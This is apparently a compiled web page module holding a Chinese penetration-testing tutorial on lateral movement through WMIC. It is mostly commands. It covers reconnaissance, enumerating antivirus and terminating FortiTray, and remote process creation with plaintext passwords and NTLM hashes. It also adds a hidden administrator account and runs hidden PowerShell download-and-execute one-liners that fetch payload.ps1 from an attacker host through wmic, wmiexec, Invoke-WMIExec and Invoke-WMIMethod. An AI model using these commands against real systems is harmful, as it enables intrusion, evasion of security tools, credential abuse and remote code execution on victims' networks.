import{_ as s,W as a,X as n,a1 as e}from"./framework-b6a07282.js";const t={},p=e(`<h2 id="wmic远程命令执行横向移动" tabindex="-1"><a class="header-anchor" href="#wmic远程命令执行横向移动" aria-hidden="true">#</a> WMIC远程命令执行横向移动</h2><h3 id="什么是wmi" tabindex="-1"><a class="header-anchor" href="#什么是wmi" aria-hidden="true">#</a> 什么是WMI</h3><ul><li>WMI（Windows Management Instrumentation）是Windows再Powershell还未发布前，微软用来管理Windows系统的重要数据库工具，WMI本身的组织架构是一个数据库架构，WMI服务使用DCOM或WinRM协议，自动PsExec再内网被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是黑客们渐渐开始使用WMI来进行横向移动。通过渗透测试发现，在使用wmiexec进行横向移动时，windwos操作系统默认不会将WMI的操作记录在日志中。因此很多APT开始使用WMI进行攻击。</li></ul><h3 id="什么是wmic" tabindex="-1"><a class="header-anchor" href="#什么是wmic" aria-hidden="true">#</a> 什么是WMIC</h3><ul><li>WMIC是WMI的扩展，提供了从命令行接口和批处理脚本执行系统管理的支持。</li><li>简单来说wmic就是wmic.exe，位于windows目录底下，是一个命令行程序。WMIC可以以两种模式执行：交互模式和非交互模式。</li></ul><h3 id="wmic常见命令" tabindex="-1"><a class="header-anchor" href="#wmic常见命令" aria-hidden="true">#</a> WMIC常见命令</h3><ul><li>WMIC命令需要本地管理员或域管理员才可以进行正常使用，普通权限用户若想要使用wmic，可以修改普通用户的ACL，不过修改用户的ACL也需要管理员权限，普通用户使用wmic。以下命令均在2008r2、2012r2、2016上进行测试，部分命令在虚拟机中测试不行。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>wmic logon list brief <span class="token comment">#登录⽤户</span>
wmic ntdomain list brief <span class="token comment">#域控机器</span>
wmic useraccount list brief <span class="token comment">#⽤户列表</span>
wmic share get name,path <span class="token comment">#查看系统共享</span>
wmic <span class="token function">service</span> list brief <span class="token operator">|</span><span class="token function">more</span> <span class="token comment">#服务列表</span>
wmic startup list full <span class="token comment">#识别开机启动的程序，包括路径</span>
wmic fsdir <span class="token string">&quot;c:<span class="token entity" title="\\\\">\\\\</span>test&quot;</span> call delete <span class="token comment">#删除C盘下的test目录</span>
wmic nteventlog get path,filename,writeable <span class="token comment">#查看系统中开启的⽇志</span>
wmic nicconfig get ipaddress,macaddress <span class="token comment">#查看系统中⽹卡的IP地址和MAC地址</span>
wmic qfe get description,installedOn <span class="token comment">#使⽤wmic识别安装到系统中的补丁情况</span>
wmic product get name,version <span class="token comment">#查看系统中安装的软件以及版本，2008R2上执行后无反应。</span>
wmic useraccount where <span class="token string">&quot;name=&#39;%UserName%&#39;&quot;</span> call <span class="token function">rename</span> newUserName <span class="token comment">#更改当前用户名</span>
wmic useraccount where <span class="token string">&quot;name=&#39;Administrator&#39;&quot;</span> call Rename admin <span class="token comment">#更改指定用户名</span>
wmic bios list full <span class="token operator">|</span> findstr /i <span class="token string">&quot;vmware&quot;</span> <span class="token comment">#查看当前系统是否是VMWARE，可以按照实际情况进行筛选</span>
wmic desktop get screensaversecure,screensavertimeout <span class="token comment">#查看当前系统是否有屏保保护，延迟是多少</span>
wmic process where <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;vmtoolsd.exe&quot;</span> get executablepath <span class="token comment">#获取指定进程可执行文件的路径</span>
wmic environment where <span class="token string">&quot;name=&#39;temp&#39;&quot;</span> get UserName,VariableValue <span class="token comment">#获取temp环境变量</span>

<span class="token comment">###查询当前主机的杀毒软件</span>
wmic process where <span class="token string">&quot;name like &#39;%forti%&#39;&quot;</span> get name
wmic process where <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;FortiTray.exe&quot;</span> call terminate
wmic /namespace:<span class="token punctuation">\\</span><span class="token punctuation">\\</span>root<span class="token punctuation">\\</span>securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe
wmic /namespace:<span class="token punctuation">\\</span><span class="token punctuation">\\</span>root<span class="token punctuation">\\</span>securitycenter2 path antispywareproduct GET displayName,productState, pathToSignedProductExe <span class="token operator">&amp;</span> wmic /namespace:<span class="token punctuation">\\</span><span class="token punctuation">\\</span>root<span class="token punctuation">\\</span>securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
wmic /Node:localhost /Namespace:<span class="token punctuation">\\</span><span class="token punctuation">\\</span>root<span class="token punctuation">\\</span>SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
<span class="token comment">###</span>

<span class="token comment">###查询windows机器版本和服务位数和.net版本</span>
wmic os get caption
wmic os get osarchitecture
wmic OS get Caption,CSDVersion,OSArchitecture,Version
wmic product where <span class="token string">&quot;Name like &#39;Microsoft .Net%&#39;&quot;</span> get Name, Version
<span class="token comment">###</span>

<span class="token comment">###查询本机所有盘符</span>
wmic logicaldisk list brief
wmic logicaldisk get description,name,size,freespace /value
<span class="token comment">###</span>

<span class="token comment">###卸载和重新安装程序</span>
wmic product where <span class="token string">&quot;name like &#39;%Office%&#39;&quot;</span> get name
wmic product where <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;Office&quot;</span> call uninstall
<span class="token comment">###</span>

<span class="token comment">### 查看某个进程的详细信息 （路径，命令⾏参数等）</span>
wmic process where <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;chrome.exe&quot;</span> list full
wmic process where <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;frp.exe&quot;</span> get executablepath,name,ProcessId   进程路径
wmic process where <span class="token assign-left variable">caption</span><span class="token operator">=</span><span class="token string">&quot;frp.exe&quot;</span> get caption,commandline /value
<span class="token comment">###</span>

<span class="token comment">### 更改PATH环境变量值，新增c:\\whoami</span>
wmic environment where <span class="token string">&quot;name=&#39;path&#39; and username=&#39;&lt;system&gt;&#39;&quot;</span> <span class="token builtin class-name">set</span> <span class="token assign-left variable">VariableValue</span><span class="token operator">=</span><span class="token string">&quot;%path%;c:\\whoami
###

### 查看某个进程的详细信息-PID
wmic process list brief
tasklist /SVC | findstr frp.exe
wmic process where ProcessId=3604 get ParentProcessId,commandline,processid,executablepath,name,CreationClassName,CreationDate
###

### 终⽌⼀个进程
wmic process where name =&quot;</span>xshell.exe&quot; call terminate
ntsd <span class="token parameter variable">-c</span> q <span class="token parameter variable">-p</span> 进程的PID
taskkill <span class="token parameter variable">-im</span> pid
<span class="token comment">###</span>

<span class="token comment">###获取电脑产品编号和型号信息</span>
wmic baseboard get Product,SerialNumber
wmic bios get serialnumber
<span class="token comment">###</span>

<span class="token comment">###安装软件</span>
wmic product get name,version
wmic product list brief
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="常见错误" tabindex="-1"><a class="header-anchor" href="#常见错误" aria-hidden="true">#</a> 常见错误</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.开启防火前时，允许共享例外
错误：
代码 <span class="token operator">=</span> 0x800706ba
说明 <span class="token operator">=</span> RPC服务器不可用
设备 <span class="token operator">=</span> Win32
<span class="token number">2</span>.组策略组织administrator远程访问时
错误：
代码 <span class="token operator">=</span> 0x80070005
说明 <span class="token operator">=</span> 拒绝访问
设备 <span class="token operator">=</span> Win32
<span class="token number">3</span>.IP安全策略阻止135时
错误：
代码 <span class="token operator">=</span> 0x800706ba
说明 <span class="token operator">=</span> RPC服务器不可用
设备 <span class="token operator">=</span> Win32
<span class="token number">4</span>.禁用winmgmt服务时
错误：
代码 <span class="token operator">=</span> 0x80070422
说明 <span class="token operator">=</span> 无法启动服务，原因可能是已被禁用或与其相关联得设备没有启动。
设备 <span class="token operator">=</span> Win32
<span class="token number">5</span>.拒绝wbem目录权限，无法使用wmic的
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="wmic调用cmd" tabindex="-1"><a class="header-anchor" href="#wmic调用cmd" aria-hidden="true">#</a> wmic调用cmd</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.向指定IP执行cmd命令
wmic /node:192.168.1.1 /user:administrator /password:Aa123456 process call create <span class="token string">&quot;cmd.exe /c ipconfig &gt;c:\\ip.txt&quot;</span>
<span class="token number">2</span>.列出远程主机
wmic /node:192.168.1.1 /user:administrator /password:Aa123456 process list breif
<span class="token number">3</span>.在远程系统上执行bat脚本
wmic /node:192.168.1.1 /user:administrator /password:Aa123456 process call create c:<span class="token punctuation">\\</span>test<span class="token punctuation">\\</span>test.bat
<span class="token number">4</span>.在远程主机上添加管理员用户
wmic /node:192.168.1.1 /user:administrator /password:Aa123456 process call create <span class="token string">&quot;cmd.exe /c net user test1 Aa123456 /add &amp;&amp; net localgroup administrators test1 /add&quot;</span>
<span class="token number">5</span>.远程执行powershell上线
wmic /NODE:192.168.1.1 /user:<span class="token string">&quot;administrator&quot;</span> /password:<span class="token string">&quot;Aa123456&quot;</span> PROCESS call create <span class="token string">&quot;powershell.exe -nop -w hidden -c <span class="token entity" title="\\&quot;">\\&quot;</span>IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>&#39;http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.10</span><span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>payload.ps1&#39;<span class="token punctuation">))</span></span><span class="token entity" title="\\&quot;">\\&quot;</span>&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="wmic工具" tabindex="-1"><a class="header-anchor" href="#wmic工具" aria-hidden="true">#</a> wmic工具</h3><h4 id="wmiexec-exe" tabindex="-1"><a class="header-anchor" href="#wmiexec-exe" aria-hidden="true">#</a> wmiexec.exe</h4><ul><li>是impacket工具包中的一个wmic工具。</li><li>有全交互式也有版交互式的远程命令执行工具，有python版本的pe版本可运行在多种环境，包括webshell环境、rdp环境、socks环境等。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>wmiexec.exe myname2008r2.hacker2.com/administrator:Aa123456@192.168.1.10 <span class="token comment">#使用明文密码获取交互式shell</span>
wmiexec.exe myname2008r2.hacker2.com/administrator:Aa123456@192.168.1.10 <span class="token string">&quot;ipconfig&quot;</span> <span class="token comment">#远程执行ipconfig命令</span>
wmiexec.exe myname2008r2.hacker2.com/administrator:Aa123456@192.168.1.10 <span class="token string">&quot;powershell.exe -nop -w hidden -c IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>&#39;http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span><span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>payload.ps1&#39;<span class="token punctuation">))</span></span>&quot;</span> <span class="token comment">#远程执行powershell上线</span>

wmiexec.exe <span class="token parameter variable">-hashes</span> aad3b435b51404eeaad3b435b51404ee:47bf8039a8506cd67c524a03ff84ba4e controlfish.hacker.com/administrator@192.168.1.1 <span class="token comment">#使用lm哈希和ntlm哈希获取shell，完整hash需要在cs工具中右键目标主机&gt;转存hash获得</span>
wmiexec.exe <span class="token parameter variable">-hashes</span> aad3b435b51404eeaad3b435b51404ee:47bf8039a8506cd67c524a03ff84ba4e controlfish.hacker.com/administrator@192.168.1.1 <span class="token string">&quot;ipconfig&quot;</span> <span class="token comment">#远程执行ipconfig命令</span>
wmiexec.exe <span class="token parameter variable">-hashes</span> aad3b435b51404eeaad3b435b51404ee:47bf8039a8506cd67c524a03ff84ba4e myname2008r2.hacker2.com/administrator@192.168.1.10 <span class="token string">&quot;powershell.exe -nop -w hidden -c IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>&#39;http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span><span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>payload.ps1&#39;<span class="token punctuation">))</span></span>&quot;</span> <span class="token comment">#远程执行powershell上线</span>

wmiexec.exe <span class="token parameter variable">-hashes</span> aad3b435b51404eeaad3b435b51404ee:47bf8039a8506cd67c524a03ff84ba4e controlfish.hacker.com/administrator@192.168.1.1 <span class="token string">&quot;powershell.exe -nop -w hidden -c IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>&#39;http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span><span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>payload.ps1&#39;<span class="token punctuation">))</span></span>&quot;</span> <span class="token comment">#远程执行powershell上线</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="wmiexec-vbs" tabindex="-1"><a class="header-anchor" href="#wmiexec-vbs" aria-hidden="true">#</a> wmiexec.vbs</h4><ul><li>通过VBS脚本调用wmi来模拟PsExec功能。其可以在远程系统中执行命令并进行回显，获取远程主机的半交互式shell。wmiexec.vbs支持两种模式，一种是半交互式shell模式，一种是单条命令模式。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>cscript.exe //nologo wmiexec.vbs /cmd <span class="token number">192.168</span>.1.1 administrator Aa123456 <span class="token string">&quot;ipconfig&quot;</span> <span class="token comment">#远程执行ipconfig命令</span>
cscript.exe //nologo wmiexec.vbs /cmd <span class="token number">192.168</span>.1.1 administrator Aa123456 <span class="token string">&quot;powershell.exe -nop -w hidden -c IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>&#39;http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span><span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>payload.ps1&#39;<span class="token punctuation">))</span></span>&quot;</span> <span class="token comment">#远程执行powershell上线</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="invoke-wmiexec" tabindex="-1"><a class="header-anchor" href="#invoke-wmiexec" aria-hidden="true">#</a> Invoke-WMIExec</h4><ul><li>Invoke-WMIExec是一个powershell脚本在Invoke-TheHash文件中。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>Invoke-WMIExec.ps1 <span class="token parameter variable">-Target</span> <span class="token number">192.168</span>.1.1 <span class="token parameter variable">-Domain</span> hacker.com <span class="token parameter variable">-Username</span> administrator <span class="token parameter variable">-Hash</span> 47bf8039a8506cd67c524a03ff84ba4e <span class="token parameter variable">-Command</span> <span class="token string">&quot;calc.exe&quot;</span> <span class="token parameter variable">-verbose</span>

shell powershell <span class="token parameter variable">-exec</span> bypass <span class="token parameter variable">-c</span> IEX <span class="token punctuation">(</span>New-Object System.Net.Webclient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">&#39;http://192.168.1.100:8080/Invoke-WMIExec.ps1&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>import-module .<span class="token punctuation">\\</span>Invoke-WMIExec.ps1<span class="token punctuation">;</span>Invoke-WMIExec <span class="token parameter variable">-Target</span> <span class="token number">192.168</span>.1.10 <span class="token parameter variable">-Domain</span> hacker2.com <span class="token parameter variable">-Username</span> administrator <span class="token parameter variable">-Hash</span> 47bf8039a8506cd67c524a03ff84ba4e <span class="token parameter variable">-Command</span> <span class="token string">&quot;whoami&quot;</span> <span class="token parameter variable">-verbose</span> <span class="token comment">#不成功</span>

shell powershell <span class="token parameter variable">-exec</span> bypass <span class="token parameter variable">-c</span> IEX <span class="token punctuation">(</span>New-Object System.Net.Webclient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">&#39;http://192.168.1.100:8080/Invoke-WMIExec.ps1&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>import-module .<span class="token punctuation">\\</span>Invoke-WMIExec.ps1<span class="token punctuation">;</span>Invoke-WMIExec <span class="token parameter variable">-Target</span> <span class="token number">192.168</span>.1.1 <span class="token parameter variable">-Username</span> administrator <span class="token parameter variable">-Hash</span> 47bf8039a8506cd67c524a03ff84ba4e <span class="token parameter variable">-Command</span> <span class="token string">&quot;powershell.exe -nop -w hidden -c IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>&#39;http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span><span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>payload.ps1&#39;<span class="token punctuation">))</span></span>&quot;</span> <span class="token parameter variable">-verbose</span> <span class="token comment">#不成功</span>

<span class="token number">1</span>.导入脚本
powershell-import .<span class="token punctuation">\\</span>Invoke-WMIExec.ps1 <span class="token comment">#该路径为cs的根路径</span>

<span class="token number">2</span>.运行上线命令
powershell Invoke-WMIExec <span class="token parameter variable">-Target</span> <span class="token number">192.168</span>.1.10 <span class="token parameter variable">-Domain</span> hacker.com <span class="token parameter variable">-Username</span> administrator <span class="token parameter variable">-Hash</span> 47bf8039a8506cd67c524a03ff84ba4e <span class="token parameter variable">-Command</span> <span class="token string">&quot;powershell.exe -nop -w hidden -c IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>&#39;http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span><span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>payload.ps1&#39;<span class="token punctuation">))</span></span>&quot;</span> <span class="token parameter variable">-verbose</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="invoke-wmimethod-ps1" tabindex="-1"><a class="header-anchor" href="#invoke-wmimethod-ps1" aria-hidden="true">#</a> Invoke-WMIMethod.ps1</h4><ul><li>该模块为Powershell内置模块，以下为示例，可以自由组合命令进行测试。示例在Windows2008R2、Windows2012R2、Windows2016均测试成功。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token variable">$User</span>            <span class="token comment">#目标系统用户名</span>
<span class="token variable">$Password</span>        <span class="token comment">#目标系统密码</span>
<span class="token variable">$Cred</span>            <span class="token comment">#账号密码整合，导入Credential</span>
Invoke-WMIMethod <span class="token comment">#远程运行指定程序</span>
<span class="token comment">#####---------------------------#####</span>

<span class="token comment">#按顺序执行</span>
<span class="token number">1</span>.<span class="token variable">$User</span> <span class="token operator">=</span> <span class="token string">&quot;controlfish.hacker.com<span class="token entity" title="\\a">\\a</span>dministrator&quot;</span>
<span class="token number">2</span>.<span class="token variable">$Password</span><span class="token operator">=</span> ConvertTo-SecureString <span class="token parameter variable">-String</span> <span class="token string">&quot;Aa123456&quot;</span> <span class="token parameter variable">-AsPlainText</span> <span class="token parameter variable">-Force</span>
<span class="token number">3</span>.<span class="token variable">$Cred</span> <span class="token operator">=</span> New-Object <span class="token parameter variable">-TypeName</span> System.Management.Automation.PSCredential <span class="token parameter variable">-ArgumentList</span> <span class="token variable">$User</span> , <span class="token variable">$Password</span>
<span class="token number">4</span>.Invoke-WMIMethod <span class="token parameter variable">-Class</span> Win32_Process <span class="token parameter variable">-Name</span> Create <span class="token parameter variable">-ArgumentList</span> <span class="token string">&quot;powershell.exe -nop -w hidden -c IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>&#39;http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span><span class="token operator">:</span><span class="token number">8080</span><span class="token operator">/</span>payload.ps1&#39;<span class="token punctuation">))</span></span>&quot;</span> <span class="token parameter variable">-ComputerName</span> <span class="token string">&quot;192.168.1.10&quot;</span> <span class="token parameter variable">-Credential</span> <span class="token variable">$Cred</span>

Invoke-WMIMethod <span class="token parameter variable">-Class</span> Win32_Process <span class="token parameter variable">-Name</span> Create <span class="token parameter variable">-ArgumentList</span> <span class="token string">&quot;命令放置点&quot;</span> <span class="token parameter variable">-ComputerName</span> <span class="token string">&quot;上线目标IP地址&quot;</span>  <span class="token parameter variable">-Credential</span> <span class="token variable">$Cred</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,25),i=[p];function o(l,c){return a(),n("div",null,i)}const m=s(t,[["render",o],["__file","WMIC远程命令执行横向移动.html.vue"]]);export{m as default};
